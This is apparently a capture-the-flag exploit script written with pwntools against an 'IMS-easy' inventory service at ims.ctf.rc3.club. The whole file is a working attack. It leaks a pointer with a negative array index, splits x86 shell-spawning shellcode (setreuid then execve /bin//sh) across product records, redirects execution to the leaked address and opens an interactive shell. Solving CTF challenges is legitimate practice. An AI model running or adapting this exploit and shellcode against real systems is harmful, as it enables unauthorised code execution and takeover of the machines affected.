#!/usr/bin/env python

from pwn import *
import re

local = False

VIEW_RECORD = str(3)
ADD_RECORD = str(1)
QUIT = str(4)

if local: 
  x = process(["./IMS-easy"])
else:
  x = remote('ims.ctf.rc3.club', '7777')

x.recvuntil('Choose: ')

def info_leak():
  x.sendline(VIEW_RECORD)
  x.recvuntil('Enter the index of the product you wish to view: ')
  x.sendline('-3')

  x.recvuntil('Product ID: ')
  leak = x.recvuntil(',')[:-1]
  leak = 2**32 + int(leak) & 0xffffffff
  log.info('leaked ptr: ' + hex(leak))
  x.recvuntil('Choose: ')
  return leak

def exploit(leak, shellcode):
  for A, B, C in zip(*[iter(shellcode)]*3):
    x.sendline(ADD_RECORD)
    x.recvuntil('Enter product ID: ')
    x.sendline(str(u32(C))) 
    x.recvuntil('Enter product code: ')
    x.sendline(A + B)
    x.recvuntil('Choose: ')

  log.info('payload delivered, trying to jmp')
  x.sendline(ADD_RECORD)
  x.recvuntil('Enter product ID: ')
  x.sendline(str(leak)) # 55555555
  x.recvuntil('Enter product code: ')
  x.sendline("XXXXYYYY")
  x.recvuntil('Choose: ')
  x.sendline(QUIT)

# sc from https://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/
shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# shellcode would be padded to 72 chars
shellcode = shellcode + "\x90" * (72 - (len(shellcode)))
log.info('payload length: %d', len(shellcode))

# group by 4 characters
shellcode = re.findall('....', shellcode)

leak = info_leak()
exploit(leak, shellcode)
x.interactive()
